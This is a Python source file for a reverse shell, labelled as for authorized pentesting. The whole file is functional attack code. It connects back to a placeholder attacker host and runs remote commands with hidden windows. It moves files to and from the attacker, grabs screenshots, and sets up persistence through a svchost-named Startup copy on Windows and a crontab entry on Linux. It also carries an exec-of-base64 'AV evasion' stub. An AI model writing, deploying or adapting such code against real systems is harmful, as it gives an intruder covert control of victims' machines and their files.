#!/usr/bin/env python3
# Fully-featured Python reverse shell - pentest authorized

import socket
import subprocess
import os
import shutil
import tempfile
import threading
import time
import base64
import sys
import platform
from pathlib import Path

class ReverseShell:
    def __init__(self, host='YOUR_ATTACKER_IP', port=4444):
        self.host = host
        self.port = port
        self.sock = None
        self.proc = None
        self.platform = platform.system().lower()
        
    def connect(self):
        """Staged connection with retry"""
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                print(f"[+] Connected: {self.host}:{self.port}")
                return True
            except:
                self.sock = None
                time.sleep(5)  # Backoff retry
    
    def receive_command(self):
        """Receive base64 encoded commands"""
        data = self.sock.recv(4096)
        return base64.b64decode(data).decode()
    
    def send_output(self, output):
        """Send base64 encoded output"""
        encoded = base64.b64encode(output.encode()).decode()
        self.sock.send(encoded.encode() + b'\n')
    
    def execute_command(self, cmd):
        """Execute OS commands stealthily"""
        try:
            if self.platform == 'windows':
                self.proc = subprocess.Popen(
                    cmd, shell=True, stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW | 0x08000000
                )
            else:
                self.proc = subprocess.Popen(
                    cmd, shell=True, stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                    preexec_fn=os.setsid
                )
            
            stdout, stderr = self.proc.communicate(timeout=10)
            output = stdout.decode() + stderr.decode()
            return output
        except:
            return "Command failed"
    
    def interactive_shell(self):
        """Full TTY shell"""
        self.sock.send(b"[SHELL]\n")
        while True:
            try:
                cmd = self.receive_command()
                if cmd.lower() in ['exit', 'quit']:
                    break
                
                if cmd.startswith('upload '):
                    self.handle_upload(cmd[7:])
                elif cmd.startswith('download '):
                    self.handle_download(cmd[9:])
                elif cmd.startswith('screenshot'):
                    self.take_screenshot()
                else:
                    output = self.execute_command(cmd)
                    self.send_output(output)
            except:
                break
        
        self.sock.close()
    
    def handle_upload(self, local_path):
        """Upload file from attacker"""
        try:
            with open(local_path, 'wb') as f:
                data = b''
                while True:
                    chunk = self.sock.recv(4096)
                    if b'EOF' in chunk:
                        f.write(chunk.replace(b'EOF', b''))
                        break
                    f.write(chunk)
            self.send_output(f"[+] Uploaded: {local_path}")
        except Exception as e:
            self.send_output(f"[-] Upload failed: {e}")
    
    def handle_download(self, remote_path):
        """Download file to attacker"""
        try:
            with open(remote_path, 'rb') as f:
                data = f.read()
                encoded = base64.b64encode(data).decode()
                self.sock.send(encoded.encode() + b'\n')
        except Exception as e:
            self.send_output(f"[-] Download failed: {e}")
    
    def take_screenshot(self):
        """Windows screenshot (requires PIL)"""
        if self.platform != 'windows':
            self.send_output("[-] Screenshot only on Windows")
            return
            
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            img_path = tempfile.mktemp(suffix='.png')
            img.save(img_path)
            
            with open(img_path, 'rb') as f:
                encoded = base64.b64encode(f.read()).decode()
                self.sock.send(encoded.encode() + b'\n')
            
            os.unlink(img_path)
        except:
            self.send_output("[-] Screenshot failed (install PIL)")
    
    def persist(self):
        """Persistence mechanisms"""
        if self.platform == 'windows':
            self.persist_windows()
        else:
            self.persist_linux()
    
    def persist_windows(self):
        """Windows persistence"""
        script_dir = Path(__file__).parent
        exe_path = script_dir / f"svchost_{os.getpid()}.exe"
        
        # Copy to startup
        startup = Path(os.environ['APPDATA']) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        target = startup / "svchost_helper.pyw"
        
        shutil.copy2(__file__, target)
    
    def persist_linux(self):
        """Linux cron persistence"""
        cron_job = f"* * * * * python3 {__file__}\n"
        os.system(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab -")
    
    def evade_av(self):
        """Basic AV evasion"""
        # Obfuscate strings
        exec(base64.b64decode(b"""
IyBPYmZ1c2NhdGVkIG1haW4gZXhlYw==
""").decode())
    
    def run(self):
        """Main execution"""
        self.persist()
        while True:
            if self.connect():
                self.interactive_shell()
                time.sleep(3)

if __name__ == "__main__":
    # Embedded config - change these
    shell = ReverseShell('YOUR_ATTACKER_IP', 4444)
    shell.run()
